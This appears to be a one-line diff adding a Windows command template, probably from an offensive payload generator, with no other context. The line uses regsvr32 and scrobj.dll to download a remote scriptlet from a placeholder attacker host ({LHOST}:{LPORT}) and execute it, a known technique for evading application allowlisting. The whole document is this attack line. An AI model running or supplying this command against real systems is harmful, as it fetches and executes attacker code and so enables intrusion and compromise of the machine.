@@ -1,0 +1,1 @@
+regsvr32 /s /n /u /i:http://{LHOST}:{LPORT}/payload.sct scrobj.dll
